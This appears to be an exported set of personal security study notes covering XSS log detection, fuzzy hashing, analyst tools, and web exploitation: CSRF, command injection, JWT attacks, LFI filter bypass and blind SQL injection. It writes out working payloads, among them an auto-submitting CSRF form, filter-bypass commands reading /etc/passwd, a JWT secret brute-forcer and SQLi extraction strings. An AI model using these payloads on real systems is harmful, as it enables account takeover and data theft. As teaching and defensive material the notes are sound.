clicks on the URL he will be directed to Google instead of the perfect LetsDefend web application. \n\nHow Attackers Take Advantage of XSS Attacks\nBecause XSS is a client-based attack method, it may seem less important than other attack methods, but XSS attacks and their impact should not be taken for granted.\nAttackers can do the following with an XSS attack:\n\n\nSteal a user’s session information\n\n\nCapture credentials\n\n\nEtc.\n\n\nHow to Prevent a XSS Vulnerability\n\nSanitize data coming from a user: Never trust data that you receive from a user. If user data needs to be processed and stored, it should first be encoded with “HTML Encoding” using special characters, only then can it be stored.\nUse a framework: Most frameworks come with preventative measures against XSS attacks.\nUse the framework correctly: Almost all frameworks used to develop web applications come with a sanitation feature, but if this is not used properly, there is still a chance for XSS vulnerabilities to occur.\nKeep your framework up-to-date: Frameworks are developed by humans, so they too can contain XSS vulnerabilities. However, these types of vulnerabilities are usually patched with security updates. You should therefore make sure that you have completed the security updates for your framework on a regular basis.\n\nDetecting XSS Attacks\nAs XSS is one of the most commonly tested vulnerabilities.\n\nLook for keywords: The easiest way to detect XSS attacks is to look for keywords such as “alert” and “script” that are commonly used in XSS payloads.\nLearn about commonly used XSS payloads: Attackers tend to use the same payloads to look for vulnerabilities before exploiting an XSS vulnerability. Therefore, familiarizing yourself with commonly used XSS payloads would make it easier for you to detect XSS vulnerabilities. You can examine some commonly used payloads here.\nCheck for the use of special characters: Check data coming from a user to see if any special characters commonly used in XSS payloads, such as greater than (&gt;) or less than (&lt;), are present.\n\nAn Example of Detection\nIn this example, we have access logs from an Apache server running WordPress. Don’t forget to revisit our lesson “Detecting SQL injection attacks” for more information about access logs.\n\nLet’s examine the access logs provided.\nFirst, let’s take a general look at the requests that were made and try to understand them. We can see that all the requests were made for the “/blog/” page and that only the “s” parameter values were changed. If you pay attention to the URLs of the websites you visit, you probably have noticed before that when you perform a search in WordPress, the words you enter are sent with the “?s=” parameter. The example we are looking at shows us that these are searches carried out in WordPress.\nIt is difficult to find examples that are easy to read, such as the example in the lesson ” Detecting SQL Injection Attacks “. Instead, we usually come across characters that have been converted to %XX as a result of URL encoding. We’ll do URL decoding next, but first, let’s look at the URLs and see if we can spot any words.\nLooking at the logs, there are javascript-related words such as “script”, “prompt” and “console.log”. The word javascript immediately brings XSS to mind. If we decode the URL, we can easily understand the requests being made.\n\nLet’s take another look at the access logs after decoding the URLs. We can clearly see the XSS payloads and definitely conclude that the WordPress application from which we received these access logs has been the victim of an XSS attack.\nWhen we examine the requested IP addresses, we find that there is more than one. Is there more than one attacker trying to perform an XSS attack at the same time? Or is the attacker constantly changing their IP address to avoid being blocked by security products such as firewalls and IPS? If you check the IP address, you will see that it belongs to Cloudflare. Since WordPress has a partnership with Cloudflare, it is quite normal that Cloudflare would be the source of the request.\n\nNow, if we look at the dates of the requests, we see that a request was made every 3-4 seconds. It is not really possible for a human to try to enter that many XSS payloads in such a short time, but it still doesn’t mean you can be sure that the number of requests made per second is excessive. Because we have the user-agent information in this example, our job is easier. Once we check the information, we see that it belongs to a urllib library. This indicates that these requests were made by an automated vulnerability scanner tool.\nSo was the attack successful? \nWithout access to the responses, we cannot be sure.\nAs a result of our investigations:\n\nIt is clear that the attack was aimed at the web application where the access logs came from.\nLooking at the number of requests and the user agent information, we determined that the attack was carried out by an automated vulnerability scanner.\nAs the application is hosted behind Cloudflare, the source IP addresses were not found.\nWe do not know if the attack was successful or not.\n"},"SOC/SOC-Analyst-Notes/fuzzy-hashing":{"slug":"SOC/SOC-Analyst-Notes/fuzzy-hashing","filePath":"SOC/SOC Analyst Notes/fuzzy hashing.md","title":"fuzzy hashing","links":[],"tags":[],"content":"Fuzzy hashing helps us to perform similarity analysis - match two files with minor differences based on the fuzzy hash values.\nOne of the examples of fuzzy hashing is the usage of SSDeep. SSDEEP creates a hash value that attempts to detect the level of similarity between two files at the binary level. This is different from a cryptographic hash (like SHA1) because a cryptographic hash can check exact matches (or non-matches)."},"SOC/SOC-Analyst-Notes/index":{"slug":"SOC/SOC-Analyst-Notes/index","filePath":"SOC/SOC Analyst Notes/index.md","title":"index","links":["SOC/SOC-Analyst-Notes/What-is-SOC","SOC/SOC-Analyst-Notes/Pyramid-of-Pain","SOC/SOC-Analyst-Notes/Cyber-Kill-Chain","SOC/SOC-Analyst-Notes/Unified-Kill-Chain","SOC/SOC-Analyst-Notes/MITRE-ATT-and-CK-Framework","SOC/SOC-Analyst-Notes/Phishing","SOC/SOC-Analyst-Notes/Web-Attacks","Malware-Analysis/Malware-Analysis","Malware-Analysis/Malicious-Doc-Analysis","SOC/SOC-Analyst-Notes/Security-Solutions","SOC/SOC-Analyst-Notes/Splunk","SOC/SOC-Analyst-Notes/Cyber-Threat-Intelligence"],"tags":[],"content":"1. What is SOC?\n2. Pyramid of Pain\n3. Cyber Kill Chain\n4. Unified Kill Chain\n5. MITRE ATT&amp;CK Framework\n6. Phishing\n7. Web Attacks\n8. Malware Analysis\n9. Malicious Doc Analysis\n10. Security Solutions\n11. Splunk\n12. Cyber Threat Intelligence"},"Tools":{"slug":"Tools","filePath":"Tools.md","title":"Tools","links":[],"tags":[],"content":"Tools I use\n\n\nVirusTotal\n\n\nAbuseIPDB\n\n\nANY.RUN\n\n\nTalos Intelligence: Reputation Center\n\n\nHybrid Analysis\n\n\nCyberChef\n\n\nHashMyFiles \n\n\nQuickHash \n\n\nBrowser.lol → Disposable online Browser\n\n\nquipqiup.com/ → Substitution bruteforce\n\n\ncrackstation.net/ → Hash cracking\n\n\nSASM: assembly programming and debugging\n\n"},"WEB-Exploitation/CSRF":{"slug":"WEB-Exploitation/CSRF","filePath":"WEB Exploitation/CSRF.md","title":"CSRF","links":[],"tags":[],"content":"Cross-Site Request Forgery (CSRF)\nIntroduction\nWhat is Cross-Site Request Forgery (CSRF)?\nCross-Site Request Forgery (CSRF) is a web application vulnerability that tricks an authenticated user into submitting an unwanted command. Also known as “session riding” or a “one-click attack,” CSRF exploits the trust a web application has in a user’s browser.\nThe attack works by forcing a user’s browser to send a forged request to a site where the user is currently authenticated. This request automatically includes the user’s session credentials (e.g., session cookies), making the server believe it’s a legitimate action initiated by the user. An attacker can leverage this to perform critical actions on the victim’s behalf, such as changing a password, transferring funds, or making a purchase.\nThe Impact of CSRF Attacks\nThe severity of a CSRF attack depends on the application’s functionality and the victim’s privilege level. Key impacts include:\n\nUnauthorized Actions: Performing state-changing actions like modifying account details (password, email), posting on social media, or placing orders.\nCompromised Data Integrity: Unauthorized modification or deletion of data. If an administrator is targeted, other user accounts could be compromised.\nFinancial Losses: Initiating fraudulent money transfers or purchases in banking or e-commerce applications.\nAccount Takeover: Gaining full control of a victim’s account by exploiting password or email change functions.\n\n\nHow CSRF Works\nA successful CSRF attack requires three conditions:\n\nA Relevant Action: The application must have a sensitive action (e.g., changing a password) that the attacker wishes to trigger.\nSession-Based Authentication: The action must be authenticated solely using session cookies or similar credentials that the browser sends automatically.\nThe Bait: The attacker must trick the victim’s browser into sending the forged HTTP request to the target server.\n\nsequenceDiagram\n    participant User\n    participant Attacker&#039;s Website\n    participant User&#039;s Browser\n    participant Vulnerable Website\n\n    User-&gt;&gt;Vulnerable Website: 1. Logs in, receives session cookie\n    activate User&#039;s Browser\n    Vulnerable Website--&gt;&gt;User&#039;s Browser: Session cookie stored\n\n    User-&gt;&gt;Attacker&#039;s Website: 2. Visits malicious site\n    Attacker&#039;s Website--&gt;&gt;User&#039;s Browser: 3. Serves malicious HTML/JS (e.g., hidden form, img tag)\n    User&#039;s Browser-&gt;&gt;Vulnerable Website: 4. Automatically sends forged request + session cookie\n    activate Vulnerable Website\n    Vulnerable Website-&gt;&gt;Vulnerable Website: 5. Server validates session cookie and processes the malicious request\n    Vulnerable Website--&gt;&gt;User&#039;s Browser: Response (victim is unaware)\n    deactivate Vulnerable Website\n    deactivate User&#039;s Browser\n\nA diagram illustrating the flow of a CSRF attack.\nExample Scenario:\n\nA victim logs into their bank at vulnerable-bank.com. Their browser stores a session cookie for this site.\nAn attacker crafts a request to transfer money, such as vulnerable-bank.com/transfer\nThe attacker embeds this request on their own website, attacker-site.com, using a hidden &lt;img&gt; tag.\n\n&lt;!-- HTML code on attacker-site.com --&gt;\n&lt;img src=&quot;vulnerable-bank.com/transfer width=&quot;0&quot; height=&quot;0&quot;&gt;\n\nThe victim, while their banking session is active, visits attacker-site.com.\nThe victim’s browser sees the &lt;img&gt; tag and automatically sends a GET request to its src URL. Crucially, the browser includes the session cookie for vulnerable-bank.com.\nThe bank’s server receives the request with a valid session cookie, treats it as a legitimate action, and transfers the money. The victim remains unaware.\n\n\nKey Concepts\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nConceptDescriptionCookieSmall pieces of data stored in a user’s browser, used by websites to remember sessions and preferences.SessionA server-side mechanism to store user-specific information throughout their interaction with a website.HTTP RequestA call made by a client (like a browser) to a server to request or send data. GET and POST are common methods.Same-Origin Policy (SOP)A browser security mechanism that restricts how a document or script from one origin can interact with a resource from another. SOP restricts reading data across origins but generally does not prevent writing data (e.g., submitting a form), which is what CSRF exploits.PayloadThe forged request crafted by the attacker to be sent by the victim’s browser to the target server.\n\nDetection and Exploitation\nKey Indicators of Vulnerability\nThe primary indicator of a CSRF vulnerability is the absence of a secret, unpredictable token used to verify a request’s authenticity. If a state-changing request relies solely on a session cookie, it is likely vulnerable.\nLook for the absence of parameters or headers like these:\n\nCommon Token Parameter Names: csrf_token, authenticity_token, __RequestVerificationToken, xsrf_token, nonce.\nCommon Token Header Names (for AJAX): X-CSRF-Token, X-XSRF-TOKEN.\n\nPOST-Based CSRF Exploitation\nThis is the most common form of CSRF, targeting actions performed via POST requests, typically from form submissions.\nScenario: Changing a user’s email address.\n1. Legitimate Request Analysis\nA legitimate request to change an email address looks like this:\nPOST /my-profile/change-email HTTP/1.1\nHost: vulnerable-site.com\nContent-Type: application/x-www-form-urlencoded\nCookie: session=AbC1dE2fGhI3jK4LmN5oPqR6sT7uV8wX\n \nemail=new.user.email@example.com\nNotice there is no unpredictable token, only the session cookie. This is a vulnerability.\n2. Preparing the CSRF Payload\nThe attacker creates a web page with a hidden, auto-submitting form.\n&lt;!-- attacker-site.com/csrf.html --&gt;\n&lt;html&gt;\n  &lt;body&gt;\n    &lt;h3&gt;Loading...&lt;/h3&gt;\n    &lt;form action=&quot;vulnerable-site.com/my-profile/change-email&quot; method=&quot;POST&quot;&gt;\n      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;attacker.email@evil.com&quot; /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n3. Exploitation and Result\n\nThe victim logs into vulnerable-site.com.\nThe attacker tricks the victim into visiting attacker-site.com/csrf.html.\nThe JavaScript on the page automatically submits the form. The victim’s browser sends the forged POST request, automatically attaching the valid session cookie.\nThe server accepts the request and changes the victim’s email, allowing the attacker to initiate a password reset and take over the account.\n\nGET-Based CSRF Exploitation\nIf a state-changing action is performed via a GET request (a poor design choice), exploitation is even easier.\nScenario: Forcing a user to follow the attacker’s account.\n1. Legitimate Request Analysis\nA legitimate “follow” action might look like this:\nGET /user/follow?user_id=123 HTTP/1.1\nHost: vulnerable-social.com\nCookie: session=Z1Y2X3W4V5U6T7S8R9Q0P\n2. Preparing the CSRF Payload\nThe attacker can trigger this request with a simple &lt;img&gt; tag, a link, or other resource-loading tags.\n&lt;!-- attacker-site.com/lure.html --&gt;\n&lt;html&gt;\n  &lt;body&gt;\n    &lt;h3&gt;Check out these cool cats!&lt;/h3&gt;\n    &lt;img src=&quot;vulnerable-social.com/user/follow style=&quot;display:none;&quot;&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\nAlternatively, the attacker can just send the malicious URL directly to the victim and entice them to click it.\n3. Exploitation and Result\nWhen the victim loads the page or clicks the link, their browser sends the GET request with their session cookie, causing them to unknowingly follow the attacker.\n\nImpacts and Payloads\nPotential Impacts of CSRF Attacks\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nAction TypeExample ScenarioPotential ImpactAccount ManagementChanging a user’s email or password.Complete account takeover.Financial TransactionsTransferring money, buying/selling stocks.Direct financial loss, fraud.E-commerce ActionsAdding items to a cart, placing an order.Unwanted purchases.Social MediaPosting content, sending messages, adding friends.Reputational damage, spreading spam.Privilege EscalationMaking an admin grant privileges to another user.Unauthorized system access.Data ManipulationDeleting a blog post or other user data.Data loss, service disruption.\nBasic CSRF Payloads\nGET-Based Payloads\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPayloadDescription&lt;a href=&quot;...&quot;&gt;Click Me!&lt;/a&gt;Triggers when the user clicks the link.&lt;img src=&quot;...&quot;&gt;Triggers automatically when the page loads. Can be hidden.&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;Triggers automatically, pretending to be a CSS file.&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;Triggers automatically, pretending to be a JavaScript file.\nPOST-Based Payloads\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPayloadDescription&lt;form...&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;The most common payload. An auto-submitting form.&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-iframe&quot;&gt;&lt;/iframe&gt;&lt;form target=&quot;csrf-iframe&quot;&gt;...Submits the form into a hidden iframe to prevent the page from reloading, making the attack stealthier.\n\nPrevention Methods\n1. Anti-CSRF Tokens (Synchronizer Token Pattern)\nThis is the most robust defense. The server generates a unique, unpredictable token for each user session and requires it to be submitted with every state-changing request.\nsequenceDiagram\n    participant Client\n    participant Server\n\n    Client-&gt;&gt;Server: 1. Requests a page with a form\n    activate Server\n    Server-&gt;&gt;Server: 2. Generates unique CSRF token\n    Server-&gt;&gt;Server: 3. Stores token in user&#039;s session\n    Server--&gt;&gt;Client: 4. Responds with the page, including the token in a hidden form field\n    deactivate Server\n\n    Client-&gt;&gt;Client: 5. User fills out and submits the form\n\n    Client-&gt;&gt;Server: 6. POST request with form data + CSRF token\n    activate Server\n    Server-&gt;&gt;Server: 7. Compares the submitted token with the token stored in the session\n    alt Tokens Match\n        Server--&gt;&gt;Client: 8. Request is valid, process the action (Success)\n    else Tokens Do Not Match\n        Server--&gt;&gt;Client: 8. Request is invalid, reject the action (Failure)\n    end\n    deactivate Server\n\nThe workflow of the Anti-CSRF Token (Synchronizer Token) pattern.\nSecure Code Example (PHP):\n&lt;?php\nsession_start();\n \nif ($_SERVER[&#039;REQUEST_METHOD&#039;] === &#039;POST&#039;) {\n    // 1. VALIDATE TOKEN\n    if (!isset($_POST[&#039;csrf_token&#039;]) || !hash_equals($_SESSION[&#039;csrf_token&#039;], $_POST[&#039;csrf_token&#039;])) {\n        die(&#039;Invalid CSRF Token!&#039;);\n    }\n    // Process the action...\n    echo &quot;Email updated successfully!&quot;;\n    // Regenerate token after use\n    unset($_SESSION[&#039;csrf_token&#039;]);\n}\n \n// 2. GENERATE TOKEN for the form\nif (empty($_SESSION[&#039;csrf_token&#039;])) {\n    $_SESSION[&#039;csrf_token&#039;] = bin2hex(random_bytes(32));\n}\n?&gt;\n \n&lt;!-- Secure Form --&gt;\n&lt;form method=&quot;POST&quot;&gt;\n    &lt;label for=&quot;email&quot;&gt;New Email:&lt;/label&gt;\n    &lt;input type=&quot;email&quot; id=&quot;email&quot; name=&quot;email&quot;&gt;\n    &lt;!-- 3. EMBED TOKEN in a hidden field --&gt;\n    &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;&lt;?php echo htmlspecialchars($_SESSION[&#039;csrf_token&#039;]); ?&gt;&quot;&gt;\n    &lt;button type=&quot;submit&quot;&gt;Update&lt;/button&gt;\n&lt;/form&gt;```\n \n**Usage in Modern JavaScript Applications (AJAX/SPA):**\nFor SPAs, the token is often placed in a `&lt;meta&gt;` tag on page load and then attached as a custom HTTP header (`X-CSRF-TOKEN`) to all subsequent AJAX requests.\n \n### 2. SameSite Cookie Attribute\nThis browser-level defense instructs browsers when to send cookies with cross-site requests.\n*   `Strict`: The cookie is *only* sent for same-site requests. Most secure, but can break functionality related to external links.\n*   `Lax`: A good balance. The cookie is sent on top-level navigation (e.g., clicking a link) but blocked on cross-site subrequests (`POST` forms, `&lt;img&gt;`, `&lt;iframe&gt;`). **This is the default for most modern browsers.**\n*   `None`: The cookie is sent with all requests. Requires the `Secure` attribute (HTTPS).\n \n**Example Header:**\n```http\nSet-Cookie: session=AbC1dE2fGh...; SameSite=Lax; HttpOnly; Secure\n3. Referer Header Validation\nThe server can check the Referer header to ensure the request originated from its own domain. However, this is unreliable as a primary defense because the Referer can be suppressed by browsers or proxies for privacy reasons. It should only be used as a secondary check.\n\nTools and Resources\nAutomated Scanning and Testing Tools\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nToolDescriptionLicenseAddressBurp SuiteIndustry-standard proxy and scanner. The Pro version can automatically detect CSRF and generate PoCs.Commercial / Freeportswigger.net/burpOWASP ZAPPopular open-source security scanner with automated and manual testing tools for detecting CSRF.Open Sourcewww.zaproxy.org/XSRFProbeA Python-based tool specifically designed to find and exploit CSRF vulnerabilities.Open Sourcegithub.com/0xInfection/XSRFProbe\nAutomated PoC Generation\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nResourceDescriptionAddresssecurity.love CSRF PoCA simple and fast online PoC generator.security.love/CSRF-PoC-GenoratorHacktify CSRF PoC GeneratorInstantly creates HTML PoC code by pasting a raw HTTP request.hacktify.in/csrf\nPayload Lists and References\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nResourceDescriptionAddressPayloadAllTheThingsComprehensive repository of payloads and exploitation techniques for many vulnerabilities, including CSRF.GitHubOWASP CSRF Cheat SheetA detailed reference from OWASP covering prevention methods against CSRF attacks.OWASP"},"WEB-Exploitation/Command-Injection":{"slug":"WEB-Exploitation/Command-Injection","filePath":"WEB Exploitation/Command Injection.md","title":"Command Injection","links":[],"tags":[],"content":"Command Injection is a security vulnerability that allows an attacker to execute arbitrary commands on a host operating system via a vulnerable application. This usually happens when user input is improperly sanitized before being used in system-level commands.\n\n📂 Basics of Command Injection\nExample:\n# Vulnerable PHP example\n&lt;?php\n  $file = $_GET[&#039;file&#039;];\n  system(&quot;cat &quot; . $file);\n?&gt;\nExploitation:\nIf user input is not sanitized, an attacker can execute:\n?file=/etc/passwd\n# Or with multiple commands\n?file=/etc/passwd; ls /root\nCommon Types:\n\n\nClassic Injection: Directly appending malicious input to a command.\n\n\nBlind Injection: No output returned; attacker infers results from side effects.\n\n\nOS Command Injection: Targets the underlying operating system commands.\n\n\n\n📂 Bypass Techniques\n\nSome filters block spaces between commands. $IFS (Internal Field Separator) can bypass this.\n\n# Normal Command\nls /etc/passwd\n \n# Filtered Command\nls/etc/passwd\n \n# Bypass Method\nls${IFS}/etc/passwd\n\nQuotes can bypass filters that block certain keywords.\n\n# Normal Command\nwhoami\n \n# Bypass Using Single Quotes\nw&#039;h&#039;o&#039;am&#039;i\n \n# Bypass Using Double Quotes\nw&quot;h&quot;o&quot;am&quot;i\n \n# Bypass Using Backticks\nwh``oami\n\nSubcommands can execute special characters.\n\n# Normal Command\nwhoami\n \n# Bypass Using $()\nwho$()ami\n \n# Bypass Using Backticks\nwho`echo am`i\n\nChain commands using unfiltered characters.\n\n# Normal Command\ngoogle.com &amp;&amp; cat /etc/passwd\n \n# Filtered Command\ngoogle.com cat /etc/passwd\n \n# Bypass Using ;\ngoogle.com ; cat /etc/passwd\n \n# Bypass Using ||\n|| cat /etc/passwd"},"WEB-Exploitation/JWT-Exploitaion":{"slug":"WEB-Exploitation/JWT-Exploitaion","filePath":"WEB Exploitation/JWT Exploitaion.md","title":"JWT Exploitaion","links":[],"tags":[],"content":"x# JWT Security Vulnerabilities and Attacks\nJWTs (JSON Web Tokens) are widely used for authentication and secure data exchange. They allow stateless verification of identity and claims. Despite this, misconfigurations or weak implementation practices can lead to serious security vulnerabilities. This note explores vulnerabilities, attack techniques, and practical exploitation methods, with detailed explanations.\n\n1. JWT Structure and Security Basics\nA JWT consists of three parts:\nheader.payload.signature\n\n\n\nHeader: Metadata about the token, including the signing algorithm (alg).\n\n\nPayload: The claims/data the server wants to exchange securely.\n\n\nSignature: Ensures integrity and authenticity by signing the header and payload.\n\n\nSecurity principle: The signature ensures that if someone tampers with the header or payload, verification fails.\nSignature creation process (simplified):\n1. Encode header and payload in Base64URL\n2. Combine: header.payload\n3. Sign using secret/private key (HMAC, RSA, etc.)\n4. Append signature to form final JWT\n\n\n2. Signature Verification Flaws\nThe signature is the most critical part of JWT security. Misconfigured verification can allow attackers to bypass authentication.\n2.1 None Algorithm Vulnerability\n\n\nWhy it exists: JWT libraries allow alg: none to indicate an unsigned token. If the server does not reject this, it will accept a token with no signature.\n\n\nHow it works:\n\n\n\nModify JWT header:\n\n{ &quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot; }\n\n\nRemove the signature.\n\n\nSend token to server → accepted as valid.\n\n\nConceptual diagram:\nOriginal JWT: header.payload.signature\nModified JWT: header.payload.\nServer accepts token → bypass authentication\n\nKey point: Never trust alg from untrusted clients.\n\n2.2 Weak Signature Keys\n\n\nWhy it’s dangerous: Symmetric algorithms (HS256) use a secret key; if it’s weak (common password, short string), it can be brute-forced.\n\n\nExploitation logic: Attackers can try a list of common passwords (dictionary) or all combinations (brute force) until the JWT decodes successfully.\n\n\nExample attack (dictionary):\nimport jwt\nfrom jwt.exceptions import InvalidSignatureError\n \njwt_token = &quot;YOUR_JWT_HERE&quot;\nwith open(&#039;dictionary.txt&#039;) as f:\nfor word in f:\n\ttry:\n\t\tdecoded = jwt.decode(jwt_token, word.strip(), algorithms=[&#039;HS256&#039;])\n\t\tprint(f&quot;Secret found: {word}, Decoded: {decoded}&quot;)\n\t\tbreak\n\texcept InvalidSignatureError:\n\t\tcontinue\n\nLesson: Use long, random keys. Avoid human-readable passwords.\n\n\n3. Algorithm Confusion Attacks\n3.1 Problem\n\n\nJWT supports multiple algorithms: symmetric (HS256) and asymmetric (RS256).\n\n\nVulnerability arises when the server automatically trusts the alg header without enforcing expected algorithm.\n\n\nAttack logic:\n\n\nServer expects RS256 (asymmetric) with public key for verification.\n\n\nAttacker changes alg to HS256 (symmetric).\n\n\nUses the server’s public key as the HMAC secret.\n\n\nToken is accepted without knowing the real private key.\n\n\nDiagram:\nServer expects RS256 verification\nAttacker signs HS256 using public key as secret\nServer verifies → token accepted\n\n3.2 Exploit Steps\nimport jwt\n \nheader = {&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;}\npayload = {&quot;sub&quot;: &quot;admin&quot;}\ntoken = jwt.encode(payload, &quot;PUBLIC_KEY_AS_SECRET&quot;, algorithm=&quot;HS256&quot;, headers=header)\nprint(token)\n\nTakeaway: Do not trust alg header from clients. Always enforce the server’s intended algorithm.\n\n\n4. JWT Header Parameter Vulnerabilities\nCertain JWT header parameters are often user-controlled, making them attack vectors.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nParameterPurposeAttack vectorjwkEmbed public keySelf-signed JWTsjkuURL to key setPoint to attacker-controlled key setkidKey IDFile path traversal or database key injectionctyContent typeExploit XML or serialized object parsingx5cX.509 certificateInject malicious certificates\n4.1 JWK Injection\n\n\nMisconfigured servers accept keys embedded in jwk.\n\n\nAttacker generates a new RSA key pair, embeds public key in JWT header, signs JWT with private key.\n\n\nServer validates against embedded public key → accepts malicious token.\n\n\n4.2 JKU Injection\n\n\nServer fetches verification keys from URL (jku).\n\n\nIf URL is not validated → attacker hosts malicious keys → server verifies attacker token.\n\n\n4.3 KID Exploitation\n\n\nkid tells server which key to use.\n\n\nVulnerable implementations allow path traversal:\n\n\n{ &quot;kid&quot;: &quot;../../secret_key_file&quot;, &quot;alg&quot;: &quot;HS256&quot; }\n\nServer reads arbitrary file → attacker can sign JWT using file content as key.\n\nLesson: Validate all header parameters and limit sources of verification keys.\n\n5. Replay Attacks\n\n\nWhy: JWTs are stateless → server cannot track usage.\n\n\nAttack: Capture a valid token and resend multiple times.\n\n\nPrevention:\n\n\nShort token lifetimes\n\n\nUse refresh tokens\n\n\nStore revoked tokens in database\n\n\n\n6. Token Lifetime &amp; Revocation Issues\n\n\nProblem: Long-lived tokens increase exposure window.\n\n\nExample: 30-day JWT → compromised token valid for 30 days.\n\n\nPrevention:\n\n\nShort lifetimes (minutes to hours)\n\n\nRefresh tokens with server-side validation\n\n\nMaintain revocation list\n\n\n\n7. JWKS Spoofing\n\n\nJSON Web Key Sets (JWKS) provide public keys for verification.\n\n\nVulnerability: Server blindly trusts keys from public endpoints → attacker can provide forged JWKS → bypass verification.\n\n\nPrevention: Only trust keys from known endpoints. Validate certificates.\n\n\n\n8. Practical Exploit Flow Example\nGoal: Gain admin access using JWT header injection\n\n\nIntercept JWT via proxy (Burp, etc.)\n\n\nModify header: alg: HS256\n\n\nSign JWT using known or weak key / public key\n\n\nOptionally inject jwk or kid parameters if server uses dynamic key selection\n\n\nSend JWT to server → access granted\n\n\nFlow Diagram:\n[Client] → [JWT Interception\n\t\t|\n\t\t|  Modify Header / Payload\n\t\t↓ \n[Attacker signs JWT] → [Server verifies]\n\t\t|\n\t\t|  Accepts malicious JWT\n\t\t↓ \n[Access Admin/Protected Resource]\n\n\n9. Security Recommendations\n\n\nEnforce strict algorithm usage (RS256 recommended).\n\n\nNever accept alg: none.\n\n\nUse strong, random keys for HMAC.\n\n\nValidate kid, jku, jwk sources.\n\n\nShort token lifetimes + refresh tokens.\n\n\nImplement rate limiting to prevent brute-force attacks.\n\n\nAudit and log all token verification failures.\n\n"},"WEB-Exploitation/LFI-Filter-Bypass":{"slug":"WEB-Exploitation/LFI-Filter-Bypass","filePath":"WEB Exploitation/LFI Filter Bypass.md","title":"LFI Filter Bypass","links":[],"tags":[],"content":"Many web applications implement various protection mechanisms against Local File Inclusion (LFI) vulnerabilities. However, these protections are often insufficient and can be bypassed using various techniques.\n\n1. Path Traversal Filters\nSome web applications use simple search-and-replace filters to block path traversal sequences (../).\nExample Code Snippet\n$language = str_replace(&#039;../&#039;, &#039;&#039;, $_GET[&#039;language&#039;]);\nThis code removes ../ sequences, but is inadequate because input is processed only once.\nBypass Example\nexample.com/index.php\n\n\n\nPayload Sent: ....//....//....//....//etc/passwd\n\n\nAfter Filtering: ../../../../etc/passwd\n\n\nOther variations: ..././, ..../\n\n2. Encoding\nFilters blocking . and / can be bypassed using URL encoding.\nExample\nexample.com/index.php%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64\n\nThis decodes to ../../../../etc/passwd.\nTip: Use online tools for encoding/decoding.\n\n3. Approved Paths\nRegex-based filters often restrict input to certain paths.\nExample\nif(preg_match(&#039;/^\\.\\/languages\\/.+$/&#039;, $_GET[&#039;language&#039;])) {\n    include($_GET[&#039;language&#039;]);\n} else {\n    echo &#039;Invalid path specified!&#039;;\n}\nBypass by starting with the approved path and escaping with ../:\nexample.com/index.php\n\n\n4. Null Byte Injection\nSome apps append .php automatically. In older PHP versions, null byte injection (%00) can bypass this.\nExample\nexample.com/index.php%00\n\nThis makes .php ignored.\n\n5. Double Encoding\nFor stronger filters, use double URL encoding.\nExample\nexample.com/index.php%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%65%74%63%252f%70%61%73%73%77%64\n\nHere %25 = %. After decoding twice → ../../../../etc/passwd."},"WEB-Exploitation/SQLi/Blind-SQLi":{"slug":"WEB-Exploitation/SQLi/Blind-SQLi","filePath":"WEB Exploitation/SQLi/Blind SQLi.md","title":"Blind SQLi","links":[],"tags":[],"content":"Blind SQLi Checks\n1. Boolean-based\n\nTest with conditions that return TRUE/FALSE:\n\nid=1&#039; AND 1=1-- → page loads normally\nid=1&#039; AND 1=2-- → page shows error/different output\n\n\n\n2. Time-based\n\nForce delay with database function:\n\nMySQL: id=1&#039; OR SLEEP(5)--\nIf response is delayed → vulnerable\n\n\n\nBlind SQLi Exploitation (Effective Payloads)\n1. Boolean-Based Payloads\n\nCheck DB name length = 5\n\n&#039; AND LENGTH(database())=5-- \n\nCheck first letter of DB = ‘a’\n\n&#039; AND SUBSTRING(database(),1,1)=&#039;a&#039;-- \n\nCheck nth character of first table name = ‘u’\n\n&#039; AND SUBSTRING((SELECT table_name \nFROM information_schema.tables LIMIT 0,1),1,1)=&#039;u&#039;-- \n\nIf true → page looks normal\nIf false → page changes / error\n\n\n2. Time-Based Payloads\n\nDelay if first char of DB = ‘a’\n\n&#039; AND IF(SUBSTRING(database(),1,1)=&#039;a&#039;, SLEEP(5), 0)-- \n\nDelay if first letter of username = ‘a’\n\n&#039; AND IF(ASCII(SUBSTRING((SELECT username \nFROM users LIMIT 0,1),1,1))=97, SLEEP(5), 0)-- \n(97 = ASCII for ‘a’)\n\nIf true → response delayed\nIf false → normal speed\n\n\n3. Extraction Steps\n\nFind DB length\n\n&#039; AND LENGTH(database())=X-- \n\n\nExtract DB name char-by-char with SUBSTRING.\n\n\nEnumerate tables\n\n\n&#039; AND IF(ASCII(SUBSTRING((SELECT table_name \nFROM information_schema.tables \nWHERE table_schema=database() LIMIT 0,1),1,1))=116, SLEEP(5), 0)-- \n(116 = ASCII of ‘t’)\n\n\nEnumerate columns.\n\n\nExtract row values one character at a time.\n\n\n\n4. Automation with sqlmap\n# Enumerate databases use threads for faster 